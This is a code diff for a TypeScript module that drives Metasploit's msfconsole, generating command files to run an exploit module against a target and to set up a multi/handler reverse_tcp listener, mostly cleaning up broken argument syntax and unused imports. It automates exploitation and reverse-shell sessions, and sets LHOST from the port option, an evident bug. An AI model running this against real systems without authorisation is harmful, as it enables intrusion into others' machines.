@@ -7,15 +7,13 @@
  * See: https://github.com/morluto/rea/blob/main/src/adapter/ida.ts
  */
 
-import { execFile, spawnSync } from "node:child_process";
+import { spawnSync } from "node:child_process";
 import { tmpdir } from "node:os";
-import { writeFileSync, readFileSync } from "node:fs";
+import { writeFileSync } from "node:fs";
 import { randomUUID } from "node:crypto";
 
-import type { ExploitResult, SessionResult, ScanResult, Provenance } from "../domain/analysisResultProjection.js";
+import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";
 
-const MSF_VERSION = "msfconsole 7.0+";  // latest msfconsole version.
-const COMMAND_FILE = "msf_commands";  // default msf file (intermediate).
 const TIMEOUT_SEC = 600;  // max 10 minutes (msfconsole).
 
 /**
@@ -33,16 +31,16 @@ export function metasploit(options: {
 }): ExploitResult {
   const msfconsole = findBinary("msfconsole");
   if (!msfconsole) {
-    return createMissingError(target: target, module: module);
+    return createMissingError(options.target, options.module);
   }
 
   // Build the intermediate file (msf file).
   const commands = [
     `setg LHOST ${options.lport || "0.0.0.0"}`,
     `set LPORT ${options.lport || "4444"}`,
-    `set RHOSTS ${target}`,
+    `set RHOSTS ${options.target}`,
     `use ${options.module}`,
-    `set RHOSTS ${target}`,
+    `set RHOSTS ${options.target}`,
   ];
 
   if (options.payload) {
@@ -63,7 +61,7 @@ export function metasploit(options: {
   commands.push("exploit -j");  // run exploit in background (JSON output).
 
   // Write the commands to a file.
-  const file = `${tmpdir()}/${randomUUID()}.${COMMAND_FILE}`;
+  const file = `${tmpdir()}/${randomUUID()}.${"msf_commands"}`;
   writeFileSync(file, commands.join("\n"));
 
   // Execute msfconsole (limited timeout).
@@ -85,7 +83,7 @@ export function metasploit(options: {
     output = `msfconsole timeout (${TIMEOUT_SEC}s exceeded)`;
   }
 
-  return parseResult(output, target: target, module: options.module);
+  return parseResult(output, options.target, options.module);
 }
 
 /** Execute a custom payload (payload). */
@@ -96,12 +94,12 @@ export function payload(options: {
   rport?: string;
 }): ExploitResult {
   const target = options.target;
-  const payloadName = `exploit/multi/handler`;
+  const payloadName = "exploit/multi/handler";
   const payloadType = options.type || "reverse_tcp";
 
   const msfconsole = findBinary("msfconsole");
   if (!msfconsole) {
-    return createMissingError(target: target, module: payloadName);
+    return createMissingError(target, payloadName);
   }
 
   // Build the commands (use multi/handler for reverse/bind shell).
@@ -114,7 +112,7 @@ export function payload(options: {
   ];
 
   // Write and execute.
-  const file = `${tmpdir()}/${randomUUID()}.${COMMAND_FILE}`;
+  const file = `${tmpdir()}/${randomUUID()}.${"msf_commands"}`;
   writeFileSync(file, commands.join("\n"));
 
   const child = spawnSync(msfconsole, [file], {
@@ -123,7 +121,7 @@ export function payload(options: {
   });
 
   const output = String(child.stdout ?? "");
-  return parseResult(output, target: target, module: payloadName);
+  return parseResult(output, target, payloadName);
 }
 
 /** Find the msfconsole binary. */
@@ -155,6 +153,18 @@ function createMissingError(target: string, module: string): ExploitResult {
   };
 }
 
+/** Create a PCAP result (provenance). */
+function createProvenance(type: string, path: string): Provenance {
+  return {
+    id: `${type}://${path}`,
+    type,
+    path,
+    label: "",
+    verified: true,
+    sensitive: path.includes("password") || path.includes("credential"),
+  };
+}
+
 /** Parse msfconsole output (find sessions, sessions, results). */
 function parseResult(output: string, target: string, module: string): ExploitResult {
   // If the output contains "session_id" or "session":
@@ -181,7 +191,7 @@ function parseResult(output: string, target: string, module: string): ExploitRes
     };
   }
 
-  // Partial (no session was opened): exploit returned partial (not no session).
+  // Partial (no session was opened): exploit returned partial (no session).
   return {
     target,
     payload: module,
